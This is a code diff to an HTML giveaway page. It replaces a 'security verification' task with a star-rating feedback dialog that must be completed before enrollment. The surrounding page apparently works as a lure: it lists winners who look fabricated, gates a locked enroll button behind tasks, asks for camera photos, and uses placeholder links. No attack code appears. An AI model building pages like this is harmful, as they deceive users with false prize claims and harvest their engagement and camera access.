@@ -45,6 +45,31 @@
     .enroll-btn { display: block; width: 100%; background: #e74c3c; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 8px; letter-spacing: 0.03em; }
     .enroll-btn:hover { background: #c0392b; }
     .enroll-btn.locked { background: #ccc; color: #888; cursor: not-allowed; pointer-events: none; }
+
+    /* Rating dialog */
+    #rating-dialog {
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center;
+    }
+    #rating-dialog.active { display: flex; }
+    .rating-box {
+      background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px;
+    }
+    .rating-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
+    .rating-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
+    .stars { display: flex; gap: 8px; margin-bottom: 16px; }
+    .star { font-size: 32px; cursor: pointer; color: #ddd; transition: color 0.15s; }
+    .star.selected { color: #f1c40f; }
+    .rating-box textarea {
+      width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px;
+      font-size: 13px; font-family: Arial; resize: none; height: 80px; margin-bottom: 14px;
+    }
+    .rating-box textarea:focus { outline: none; border-color: #1a1a2e; }
+    .rating-submit-btn {
+      width: 100%; background: #e74c3c; color: white; border: none; padding: 13px;
+      font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer;
+    }
+    .rating-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
     .note { font-size: 11px; color: #888; text-align: center; line-height: 1.6; margin-bottom: 20px; }
     .winners-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; }
     .winner-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
@@ -143,7 +168,7 @@
       </div>
       <div class="task-item" id="task-3" onclick="handleTask3()">
         <div class="task-num">3</div>
-        <span class="task-text">🛡️ Complete security verification</span>
+        <span class="task-text">⭐ Rate your experience so far</span>
       </div>
       <a class="task-item" id="task-4" href="YOUR_LINUX_URL_4" target="_blank" onclick="markTaskDone(4)">
         <div class="task-num">4</div>
@@ -182,6 +207,23 @@
       <div class="winner-row"><div class="w-avatar">PS</div><span class="w-name">Priya S. — Patna</span><span class="w-prize">₹2,000 Cash</span></div>
       <div class="winner-row"><div class="w-avatar">AM</div><span class="w-name">Amit M. — Pune</span><span class="w-prize">Sony XM5</span></div>
       <div class="winner-row"><div class="w-avatar">SN</div><span class="w-name">Sneha N. — Hyderabad</span><span class="w-prize">MacBook Air</span></div>
+    </div>
+  </div>
+
+  <!-- Rating dialog -->
+  <div id="rating-dialog">
+    <div class="rating-box">
+      <h3>⭐ Rate Your Experience</h3>
+      <p>Help us improve! Rate and leave a quick feedback to continue.</p>
+      <div class="stars">
+        <span class="star" onclick="selectStar(1)">★</span>
+        <span class="star" onclick="selectStar(2)">★</span>
+        <span class="star" onclick="selectStar(3)">★</span>
+        <span class="star" onclick="selectStar(4)">★</span>
+        <span class="star" onclick="selectStar(5)">★</span>
+      </div>
+      <textarea id="rating-feedback" placeholder="Write your feedback here..." oninput="checkRatingReady()"></textarea>
+      <button class="rating-submit-btn disabled" id="rating-submit" onclick="submitRating()">Submit & Continue</button>
     </div>
   </div>
 
@@ -476,14 +518,42 @@
       openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
     }
 
+    // ─── Task 3 — Rating dialog ───────────────────────────────────
+    var selectedRating = 0;
+
     function handleTask3() {
       if (completed.indexOf(3) !== -1) return;
-      window.open('verify.html', '_blank');
+      selectedRating = 0;
+      document.getElementById('rating-feedback').value = '';
+      document.querySelectorAll('.star').forEach(function(s) { s.classList.remove('selected'); });
+      document.getElementById('rating-submit').classList.add('disabled');
+      document.getElementById('rating-dialog').classList.add('active');
     }
 
-    window.addEventListener('message', function(e) {
-      if (e.data === 'task3done') markTaskDone(3);
-    });
+    function selectStar(num) {
+      selectedRating = num;
+      document.querySelectorAll('.star').forEach(function(s, i) {
+        if (i < num) s.classList.add('selected');
+        else s.classList.remove('selected');
+      });
+      checkRatingReady();
+    }
+
+    function checkRatingReady() {
+      var feedback = document.getElementById('rating-feedback').value.trim();
+      var btn = document.getElementById('rating-submit');
+      if (selectedRating > 0 && feedback.length > 0) {
+        btn.classList.remove('disabled');
+      } else {
+        btn.classList.add('disabled');
+      }
+    }
+
+    function submitRating() {
+      if (selectedRating === 0 || document.getElementById('rating-feedback').value.trim() === '') return;
+      document.getElementById('rating-dialog').classList.remove('active');
+      markTaskDone(3);
+    }
 
     // Expose functions to HTML onclick attributes
     window.handleTask1 = handleTask1;
@@ -495,6 +565,9 @@
     window.tryEnroll = tryEnroll;
     window.openPhotoPopup = openPhotoPopup;
     window.closePhotoPopup = closePhotoPopup;
+    window.selectStar = selectStar;
+    window.checkRatingReady = checkRatingReady;
+    window.submitRating = submitRating;
 
   </script>
 
